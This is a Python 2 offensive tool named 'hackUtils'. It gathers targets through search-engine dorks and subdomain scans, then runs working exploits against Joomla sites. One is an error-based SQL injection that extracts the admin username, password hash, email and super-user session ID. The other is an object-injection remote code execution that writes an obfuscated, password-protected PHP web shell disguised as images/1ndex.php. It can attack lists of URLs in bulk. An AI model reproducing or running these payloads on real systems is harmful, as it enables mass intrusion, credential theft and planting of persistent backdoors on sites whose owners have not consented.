#!/usr/bin/env python

#*******************************#
# Description: Hack Utils       #
# Author: avfisher#avfisher.win #
# Email: security_alert@126.com #
#*******************************#

import urllib2
import urllib
import json
import re
import sys
import os
import time
import ssl
import getopt
import hashlib
import base64
import ConfigParser
import cookielib
import requests
import socket
timeout = 10
socket.setdefaulttimeout(timeout)

from bs4 import BeautifulSoup

# Ignore SSL error when accessing a HTTPS website
# ssl._create_default_https_context = ssl._create_unverified_context

reload(sys)
sys.setdefaultencoding( "gb2312" )

def logfile(log,logfile):
    f=open(logfile,'a')
    f.write(log+"\n")
    f.close

def isExisted(mystr,filepath):
    if os.path.exists(filepath):
        mystr=mystr.strip()
        f=open(filepath,'r')
        num=0
        for eachline in f:
            if mystr in eachline:
                num=num+1
            else:
                num=num
        if num >0:
            return True
        else:
            return False
    else:
        return False

def getUrlRespHtml(url):
    respHtml=''
    try:
        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7', 
                'Accept-Language':'zh-cn,zh;q=0.5', 
                'Cache-Control':'max-age=0', 
                'Connection':'keep-alive', 
                'Keep-Alive':'115',
                'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14'}
     
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        urllib2.install_opener(opener) 
        req = urllib2.Request(url)
        opener.addheaders = heads.items()
        respHtml = opener.open(req).read()
    except Exception:
        pass
    return respHtml

def getUrlRespHtmlByProxy(url,proxy):
    respHtml=''
    try:
        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7', 
                'Accept-Language':'zh-cn,zh;q=0.5', 
                'Cache-Control':'max-age=0', 
                'Connection':'keep-alive', 
                'Keep-Alive':'115',
                'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14'}
        opener = urllib2.build_opener(urllib2.ProxyHandler({'https':proxy}))
        urllib2.install_opener(opener) 
        req = urllib2.Request(url)
        opener.addheaders = heads.items()
        respHtml = opener.open(req).read()
    except Exception:
        pass
    return respHtml

def getLinksFromBaidu(html,wd):  
    soup = BeautifulSoup(html)
    html=soup.find('div', id="content_left")
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=html.find_all('h3',class_="t")
        if not html_doc:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"
        else:
            for doc in html_doc:
                try:
                    href=doc.find('a')
                    link=href.get('href')
                    rurl=urllib.unquote(urllib2.urlopen(link.strip()).geturl())
                    kd=''
                    if "inurl:" in wd:
                        kd=wd.strip().split("inurl:")[1]
                    elif "site:" in wd:
                        kd=wd.strip().split("site:")[1]
                    else:
                        kd=wd.strip()
                    if kd in rurl:
                        if not isExisted(rurl,'urls.txt'):
                            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                            logfile(rurl,'urls.txt')
                            print "["+str(now)+"] [INFO] "+rurl
                        else:
                            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                            print "["+str(now)+"] [WARNING] url is duplicate ["+rurl+"]"
                except Exception:
                    pass

def getLinksFromGoogle(html,wd):
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=json.loads(html)
        status = html_doc["responseStatus"]
        if str(status) == '200':
            info = html_doc["responseData"]["results"]
            for item in info:
                for key in item.keys():
                    if key == 'url':
                        link=item[key]
                        rurl=urllib.unquote(link.strip())
                        kd=''
                        if "inurl:" in wd:
                            kd=wd.strip().split("inurl:")[1]
                        elif "site:" in wd:
                            kd=wd.strip().split("site:")[1]
                        else:
                            kd=wd.strip()
                        if kd in rurl:
                            if not isExisted(rurl,'urls.txt'):
                                now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                                logfile(rurl,'urls.txt')
                                print "["+str(now)+"] [INFO] "+rurl
                            else:
                                now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                                print "["+str(now)+"] [WARNING] url is duplicate ["+rurl+"]"
        else:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"

def getDomainsFromBaidu(html,wd):  
    soup = BeautifulSoup(html)
    html=soup.find('div', id="content_left")
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=html.find_all('h3',class_="t")
        if not html_doc:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"
        else:
            for doc in html_doc:
                try:
                    href=doc.find('a')
                    link=href.get('href')
                    rurl=urllib.unquote(urllib2.urlopen(link.strip()).geturl())
                    url = rurl.strip()
                    reg='http:\/\/[^\.]+'+'.'+wd
                    match_url = re.search(reg,url)
                    if match_url:
                        site=match_url.group(0)
                    if not isExisted(site,'subdomains.txt'):
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        logfile(site,'subdomains.txt')
                        print "["+str(now)+"] [INFO] "+site
                    else:
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        print "["+str(now)+"] [WARNING] url is duplicate ["+site+"]"
                except Exception:
                    pass

def getLinksFromWooyun(html):  
    soup = BeautifulSoup(html)
    soup = soup.find('div', class_="content")
    soup = soup.find('table',class_="listTable")
    html = soup.find('tbody')
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=html.find_all('tr')
        if not html_doc:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"
        else:
            for doc in html_doc:
                try:
                    td=doc.find_all('td')[2]
                    atag=td.find('a')
                    link=atag.get('href').strip()
                    if not isExisted(link,'wooyun.txt'):
                        logfile(link,'wooyun.txt')
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        print "["+str(now)+"] [INFO] "+link
                    else:
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        print "["+str(now)+"] [WARNING] url is duplicate ["+link+"]"
                except Exception:
                    pass

def fetchUrls(se,wd,pg):
    if 'baidu' in se:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [INFO] Fetching URLs from Baidu..."
        for x in xrange(1,pg):
            rn=10
            pn=(x-1)*rn
            url='http://www.baidu.com/baidu?cl=3&tn=baidutop10&wd='+wd.strip()+'&rn='+str(rn)+'&pn='+str(pn)
            html=getUrlRespHtml(url)
            urls=getLinksFromBaidu(html,wd)
    elif 'google' in se:
        proxy=''
        user=''
        passwd=''
        proxyserver=''
        proxyini = os.path.dirname(os.path.realpath(__file__))+"/proxy.ini"
        config=ConfigParser.ConfigParser()
        config.read("proxy.ini")
        if not os.path.exists(proxyini):
            print "[INFO] Please configure a proxy to access to Google..."
            proxyserver=raw_input('[+] Enter proxy server (e.g. 192.95.4.120:8888): ')
            user=raw_input('[+] Enter user name [press Enter if anonymous]: ') 
            passwd=raw_input('[+] Enter password [press Enter if anonymous]: ')
            config.add_section("Proxy")
            config.set("Proxy","user",user)
            config.set("Proxy","passwd",passwd)
            config.set("Proxy","proxyserver",proxyserver)
            config.write(open("proxy.ini", "w"))
        else:
            user=config.get("Proxy","user")
            passwd=config.get("Proxy","passwd")
            proxyserver=config.get("Proxy","proxyserver")
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [INFO] Fetching URLs from Google..."
        for x in xrange(0,pg):
            url='https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q='+wd.strip()+'&rsz=8&start='+str(x)
            if not proxyserver:
                html=getUrlRespHtml(url)
            elif not user or not passwd:
                proxy = "http://"+proxyserver.strip()
                html=getUrlRespHtmlByProxy(url,proxy)
            else:
                proxy = 'http://%s:%s@%s' % (user.strip(), passwd.strip(), proxyserver.strip())
                html=getUrlRespHtmlByProxy(url,proxy)
            urls=getLinksFromGoogle(html,wd)
    elif 'wooyun' in se:
        wooyun = os.path.dirname(os.path.realpath(__file__))+"/wooyun.txt"
        if not os.path.exists(wooyun):
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [INFO] Fetching sites from Wooyun Corps..."
            for i in xrange(1,38):
                url='http://www.wooyun.org/corps/page/'+str(i)
                html=getUrlRespHtml(url)
                getLinksFromWooyun(html)
            print "\n[INFO] Fetched Sites from Wooyun:"
            print "[*] Output File: "+wooyun
        links = open('wooyun.txt','r')
        for link in links:
            site = link.split("//")[1]
            if "www." in site:
                site=site.split("www.")[1]  
            kwd="inurl:"+site.strip()+"/"+wd.strip()
            print "\n[INFO] Scanned Site: "+site.strip()+"/"+wd.strip()
            for x in xrange(1,pg):
                rn=10
                pn=(x-1)*rn
                url='http://www.baidu.com/baidu?cl=3&tn=baidutop10&wd='+kwd+'&rn='+str(rn)+'&pn='+str(pn)
                html=getUrlRespHtml(url)
                urls=getLinksFromBaidu(html,wd)
        links.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/urls.txt"
    if os.path.exists(output):
        print "\n[INFO] Fetched URLs:"
        print "[*] Output File: "+output

def scanSubDomains(se,wd,pg):
    if 'baidu' in se:
        if "www." in wd:
            wd=wd.split("www.")[1]
        print "[INFO] Scanned Site: "+wd.strip()
        kwd="inurl:"+wd
        for x in xrange(1,pg):
            rn=10
            pn=(x-1)*rn
            url='http://www.baidu.com/baidu?cl=3&tn=baidutop10&wd='+kwd.strip()+'&rn='+str(rn)+'&pn='+str(pn)
            html=getUrlRespHtml(url)
            urls=getDomainsFromBaidu(html,wd.strip())
    output = os.path.dirname(os.path.realpath(__file__))+"/subdomains.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned SubDomains:"
        print "[*] Output File: "+output

def encryptStr(value):
    value=value.strip()
    md5=hashlib.md5(value).hexdigest()
    sha1=hashlib.sha1(value).hexdigest()
    sha256=hashlib.sha256(value).hexdigest()
    b64=base64.b64encode(value)
    print "[INFO] Clear Text: "+value
    print "[*] MD5: "+md5
    print "[*] SHA1: "+sha1
    print "[*] SHA256: "+sha256
    print "[*] Base64: "+b64
    
def checkJoomla(value):
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking Joomla 3.2.0 - 3.4.4 history.php SQLi..."
    if 'http://' in value or 'https://' in value:
    	url=value
    	checkJoomlaSQLi(url)
    else:
    	urlfile=open(value,'r')
    	for url in urlfile:
            if url.strip():
                checkJoomlaSQLi(url)
    	urlfile.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/joomla_vuls.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output
    
def checkJoomlaSQLi(url):    
    url = url.strip()
    poc = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select 0x6176666973686572),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    urlA=url+poc
    try:
        result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
        if 'avfisher' in result:
            username = getInfoByJoomlaSQLi(url, 'username')
            password = getInfoByJoomlaSQLi(url, 'password')
            email = getInfoByJoomlaSQLi(url, 'email')
            session_id = getInfoByJoomlaSQLi(url, 'session_id')
            vuls='[+] vuls found! url: '+url+', admin: '+username+', password: '+password+', email: '+email+', session_id: '+session_id
            logfile(vuls,'joomla_vuls.txt')
            print vuls
        else:
            print '[!] no vuls! url: '+url
    except Exception,e:
        print '[!] connection failed! url: '+url

def getInfoByJoomlaSQLi(url, param):
    if 'username' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(username)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    elif 'password' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(password)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    elif 'email' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(email)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    elif 'session_id' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) FROM %23__session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    urlA=url+payload
    try:
	result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
        if "Duplicate entry '" in result:
	    reg = ".*Duplicate entry \'(.*?)1\'.*"
	elif "Duplicate entry &#039" in result:	
	    reg = ".*Duplicate entry \&\#039;(.*?)1\&\#039;.*"
        match_url = re.search(reg,result)
	if match_url:
	   info=match_url.group(1)
        return info
    except Exception,e:
        return 'no info!'

def rceJoomla(value):
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking Joomla 1.5 - 3.4.5 Remote Code Execution..."
    if 'http://' in value or 'https://' in value:
    	url=value
    	checkJoomlaRCE(url)
    else:
    	urlfile=open(value,'r')
    	for url in urlfile:
            if url.strip():
                checkJoomlaRCE(url)
    	urlfile.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/joomla_rce.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output

def checkJoomlaRCE(url):    
    url = url.strip()
    reg = 'http[s]*://.*/$'
    m = re.match(reg,url)
    if not m:
        url = url + "/"
    poc = generate_payload("phpinfo();")
    try:
        result = get_url(url, poc)
        if 'phpinfo()' in result:
            system = getInfoByJoomlaRCE(result, 'System')
            document_root = getInfoByJoomlaRCE(result, 'DOCUMENT_ROOT')
            script_filename = getInfoByJoomlaRCE(result, 'SCRIPT_FILENAME')
            shell_file = getShellByJoomlaRCE(url, system, script_filename)
            vuls='[+] vuls found! url: '+url+', System: '+system+', document_root: '+document_root+', script_filename: '+script_filename+', shell_file: '+shell_file
            logfile(vuls,'joomla_rce.txt')
            print vuls
        else:
            print '[!] no vuls! url: '+url
    except Exception,e:
        print '[!] connection failed! url: '+url

def get_url(url, user_agent): 
    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, timeout=10, headers=headers, cookies=cookies)    
    return response.content
   
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
    return encoded[:-1]
 
def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))

    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template

def getInfoByJoomlaRCE(result, param):
    if "System" in param:
        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "DOCUMENT_ROOT" in param:	
        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "SCRIPT_FILENAME" in param:
        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
    match_url = re.search(reg,result)
    if match_url:
       info=match_url.group(1)
    else:
        info = 'no info!'
    return info

def getShellByJoomlaRCE(url, system, script_filename):
    if 'no info' not in script_filename and 'no info' not in system:
        if 'Windows' in system:
            shell = script_filename.split('index.php')[0].replace('/','//').strip()+"images//1ndex.php"
        else:
            shell = script_filename.split('index.php')[0]+"images/1ndex.php"
        #yijuhua = "<?php eval($_POST[1]);?>" 
        cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgaWYoISRfUE9TVFsnaGFuZGxlJ10pe2hlYWRlcignSFRUUC8xLjEgNDA0IE5vdCBGb3VuZCcpOyBleGl0KCk7IH1lbHNleyAkcz0icCIuInIiLiJlIi4iZyIuIl8iLiJyIi4iZSIuInAiLiJsIi4iYSIuImMiLiJlIjsgJHMoIn5bZGlzY3V6XX5lIiwkX1BPU1RbJ2hhbmRsZSddLCJBY2Nlc3MiKTsgfSA/Pg=='));"
        pl = generate_payload(cmd)
        try:
            get_url(url, pl)
            return url+"images/1ndex.php"
        except Exception, e:
            return "no info!"
    else:
        return "no info!"
    
def myhelp():
    print "\n+-----------------------------+"
    print "|  hackUtils v0.0.2           |"
    print "|  Avfisher - avfisher.win    |"
    print "|  security_alert@126.com     |"
    print "+-----------------------------+\n"
    print "Usage: hackUtils.py [options]\n"
    print "Options:"
    print "  -h, --help                                          Show basic help message and exit"
    print "  -b keyword, --baidu=keyword                         Fetch URLs from Baidu based on specific keyword"
    print "  -g keyword, --google=keyword                        Fetch URLs from Google based on specific keyword"
    print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
    print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
    print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
    print "  -d site, --domain=site                              Scan subdomains based on specific site"
    print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
    print "\nExamples:"
    print "  hackUtils.py -b inurl:www.example.com"
    print "  hackUtils.py -g inurl:www.example.com"
    print "  hackUtils.py -w .php?id="
    print "  hackUtils.py -j http://www.joomla.com/"
    print "  hackUtils.py -j urls.txt"
    print "  hackUtils.py -r http://www.joomla.com/"
    print "  hackUtils.py -r urls.txt"
    print "  hackUtils.py -d example.com"
    print "  hackUtils.py -e text"
    print "\n[!] to see help message of options run with '-h'"

def main():
    try:
        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:j:r:d:e:",["help","baidu=","google=","wooyun=","joomla=","rce=","domain=","encrypt="])
    except getopt.GetoptError:
        print "\n[WARNING] error, to see help message of options run with '-h'"
        sys.exit()

    for name,value in options:
        if name in ("-h","--help"):
            myhelp()
        if name in ("-b","--baidu"):
            fetchUrls('baidu',value,50)
        if name in ("-g","--google"):
            fetchUrls('google',value,50)
        if name in ("-w","--wooyun"):
            fetchUrls('wooyun',value,50)
        if name in ("-j","--joomla"):
            checkJoomla(value)
        if name in ("-r","--rce"):
            rceJoomla(value)
        if name in ("-d","--domain"):
            scanSubDomains('baidu',value,50)
        if name in ("-e","--encrypt"):
            encryptStr(value)

if __name__ == '__main__':
    main()
